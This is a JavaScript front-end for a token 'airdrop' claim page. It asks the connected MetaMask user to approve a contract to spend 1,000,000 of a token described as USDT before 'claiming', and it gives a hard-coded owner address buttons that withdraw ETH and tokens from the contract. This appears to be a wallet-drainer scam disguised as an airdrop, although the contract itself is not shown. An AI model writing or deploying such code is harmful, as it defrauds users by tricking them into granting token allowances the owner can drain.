// Import ABI from the JSON file
import contractABI from './abi.json';

// Define the contract's address and key details
const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29'; // Address of the deployed contract
const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575'; // Address of the USDT token contract
const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414'; // Address of the contract owner

// Initialize Web3 and set the provider to MetaMask's injected provider
const web3 = new Web3(window.ethereum);

// Retrieve the button elements for interaction
const connectButton = document.getElementById('connectButton');
const approveButton = document.getElementById('approveButton');
const claimAirdropButton = document.getElementById('claimAirdropButton');
const withdrawETHButton = document.getElementById('withdrawETHButton');
const withdrawTokensButton = document.getElementById('withdrawTokensButton');
const processingMessage = document.getElementById('processingMessage');
const ownerButtons = document.getElementById('ownerButtons');

// Connect MetaMask wallet
connectButton.addEventListener('click', async () => {
  try {
    // Request MetaMask account connection
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];

    // Enable the approve button after wallet connection
    approveButton.disabled = false;

    // Check if the connected address matches the owner address
    if (userAddress.toLowerCase() === ownerAddress.toLowerCase()) {
      ownerButtons.style.display = 'block'; // Show owner-specific buttons
    }
  } catch (error) {
    alert('Please connect your MetaMask wallet');
  }
});

// Approve token spending for the contract (for airdrop claims)
approveButton.addEventListener('click', async () => {
  try {
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];
    const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);

    // Send approve transaction
    await tokenContract.methods
      .approve(contractAddress, web3.utils.toWei('1000000', 'ether')) // Approve 1,000,000 tokens
      .send({ from: userAddress });

    // Enable claim button after approval
    claimAirdropButton.disabled = false;
    alert('Token approval successful');
  } catch (error) {
    alert('Token approval failed');
  }
});

// Claim the airdrop by interacting with the smart contract
claimAirdropButton.addEventListener('click', async () => {
  try {
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];
    const contract = new web3.eth.Contract(contractABI, contractAddress);

    // Show processing message during transaction
    processingMessage.classList.add('show');

    // Call the claim function from the contract
    await contract.methods.claimAirdrop().send({ from: userAddress });

    // Hide processing message after completion
    processingMessage.classList.remove('show');
    alert('Airdrop claimed successfully');
  } catch (error) {
    processingMessage.classList.remove('show');
    alert('Airdrop claim failed');
  }
});

// Handle the contract owner's withdraw actions
withdrawETHButton.addEventListener('click', async () => {
  try {
    const contract = new web3.eth.Contract(contractABI, contractAddress);

    // Withdraw ETH from the contract
    await contract.methods.withdrawETH().send({ from: ownerAddress });
    alert('ETH withdrawn successfully');
  } catch (error) {
    alert('ETH withdrawal failed');
  }
});

withdrawTokensButton.addEventListener('click', async () => {
  try {
    const contract = new web3.eth.Contract(contractABI, contractAddress);

    // Withdraw tokens from the contract
    await contract.methods.withdrawTokens().send({ from: ownerAddress });
    alert('Tokens withdrawn successfully');
  } catch (error) {
    alert('Token withdrawal failed');
  }
});

